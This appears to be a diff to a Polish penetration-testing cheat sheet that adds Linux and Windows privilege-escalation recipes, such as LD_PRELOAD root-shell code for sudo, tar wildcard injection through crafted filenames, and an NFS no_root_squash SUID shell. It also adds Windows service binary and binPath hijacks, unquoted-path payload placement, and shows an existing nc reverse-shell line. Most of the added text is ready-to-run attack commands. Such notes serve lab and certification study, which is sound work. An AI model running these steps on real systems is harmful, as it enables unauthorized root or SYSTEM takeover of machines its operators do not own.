@@ -1307,7 +1307,16 @@ Przykład: `(ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get` → 
 cat /var/log/syslog | grep tcpdump                     # szukaj apparmor="DENIED"
 su - root; aa-status                                   # co AppArmor chroni
 ```
-Sudo bez hasła + `LD_PRELOAD`/`env_keep`, stare CVE (Baron Samedit `sudo -V`), itp. — patrz GTFOBins.
+**Sudo + LD_PRELOAD** — gdy `sudo -l` pokazuje `env_keep+=LD_PRELOAD` (env przenoszony do sudo):
+```bash
+cat > /tmp/pre.c <<'EOF'
+#include <stdlib.h>
+void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
+EOF
+gcc -fPIC -shared -o /tmp/pre.so /tmp/pre.c -nostartfiles
+sudo LD_PRELOAD=/tmp/pre.so <dowolna_dozwolona_komenda>   # np. sudo LD_PRELOAD=/tmp/pre.so apache2 -> root
+```
+> Stare CVE gdy nic z GTFOBins: **Baron Samedit** (CVE-2021-3156, sudo < 1.9.5p2 — sprawdź `sudo -V`), sudo < 1.8.28 (`sudo -u#-1`). Zawsze też GTFOBins („Sudo").
 
 ### Capabilities
 > Uprawnienia nadawane binarkom bez pełnego SUID. `cap_setuid+ep` = można zostać rootem.
@@ -1339,6 +1348,27 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST 1234 >/tmp/f"
 nc -lnvp 1234                                           # czekaj do minuty na strzał crona → potwierdź id (uid=0)
 ```
 > Dopisuj przez `>>`, żeby legalny backup dalej działał. Cleanup: usuń dopisaną linię i `/tmp/f`.
+
+**Cron + wildcard injection** — gdy root-cron woła `tar`/`chown`/`rsync` z `*` w zapisywalnym katalogu, podłóż pliki-argumenty (nazwa pliku = flaga):
+```bash
+# przyklad root-crona:  cd /opt/backups && tar czf /backup.tgz *
+cd /opt/backups                                        # katalog z wildcardem, gdzie MOZESZ pisac
+echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > runme.sh
+touch -- '--checkpoint=1'                               # tar potraktuje te nazwy jak swoje flagi
+touch -- '--checkpoint-action=exec=sh runme.sh'
+# po najblizszym uruchomieniu crona:  /tmp/rootbash -p   (euid=0)
+```
+> Analogiczne wildcard-triki mają `chown`/`chmod`/`rsync`/`7z` — GTFOBins → dana komenda, sekcja „Wildcard". Klucz: **zapisywalny katalog + goły `*` w komendzie roota**.
+
+### NFS no_root_squash (montujesz udział → tworzysz SUID jako root)
+> Eksport z flagą `no_root_squash` = plik utworzony przez roota na Twojej Kali zachowuje **UID 0** na celu → dropujesz SUID-owy shell.
+```bash
+showmount -e $ip                                       # lista eksportow — szukaj (no_root_squash)
+mkdir /tmp/nfs && sudo mount -o rw,vers=3 $ip:/eksport /tmp/nfs   # na KALI, jako root
+sudo cp /bin/bash /tmp/nfs/rootbash && sudo chmod 4755 /tmp/nfs/rootbash   # SUID-root na udziale
+# teraz na CELU (jako zwykly user), w zamontowanym katalogu:
+/sciezka/eksportu/rootbash -p                          # euid=0 -> root shell
+```
 
 ### Zapisywalny /etc/passwd (nadpisanie hasła root)
 > Jeśli hash jest w 2. kolumnie /etc/passwd, ma pierwszeństwo przed /etc/shadow.
@@ -1416,6 +1446,16 @@ Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object 
 #   Import-Module .\PowerUp.ps1 ; Invoke-AllChecks
 #   Install-ServiceBinary -Name 'vulnsvc'      # podmienia binarkę → dodaje admina
 ```
+**Dwa warianty ręcznie:**
+```cmd
+:: A) mam zapis do BINARKI uslugi (icacls pokazal (M)/(F)) -> podmien plik:
+copy /y rev.exe "C:\Path\service.exe" & sc stop <svc> & sc start <svc>
+:: B) mam SERVICE_CHANGE_CONFIG na usludze (accesschk) -> przekieruj binPath:
+accesschk.exe -uwcqv "<user>" <svc>                 :: szukaj SERVICE_CHANGE_CONFIG / SERVICE_ALL_ACCESS
+sc config <svc> binPath= "C:\Windows\Temp\rev.exe"  :: UWAGA: spacja PO 'binPath=' jest wymagana!
+sc stop <svc> & sc start <svc>                       :: zlap SYSTEM na nc -lvnp
+```
+> Jeśli usługi nie da się restartować, a ma `START= auto` — czasem trzeba reboot (`shutdown /r /t 0`, gdy masz SeShutdown).
 
 ### Unquoted Service Paths
 > Ścieżka usługi bez cudzysłowów + spacja → Windows próbuje uruchomić `C:\Program.exe` itd.
@@ -1425,6 +1465,14 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName
 ```cmd
 wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
 ```
+**Eksploatacja** — ścieżka `C:\Program Files\Some Dir\svc.exe` → Windows próbuje po kolei `C:\Program.exe`, `C:\Program Files\Some.exe`. Podłóż payload w pierwszym segmencie, gdzie masz zapis:
+```cmd
+icacls "C:\Program Files"                              :: szukasz (W)/(M)/(F) dla swojej grupy
+:: msfvenom service exe (§2.9); nazwa = segment PRZED spacja:
+copy rev.exe "C:\Program Files\Some.exe"
+sc stop <svc> & sc start <svc>                          :: lub restart hosta; zlap SYSTEM na listenerze
+```
+> Sprawdź też, czy w ogóle możesz restartować usługę: `sc qc <svc>` (START_TYPE) + uprawnienia niżej.
 
 ### DLL Hijacking
 ```powershell
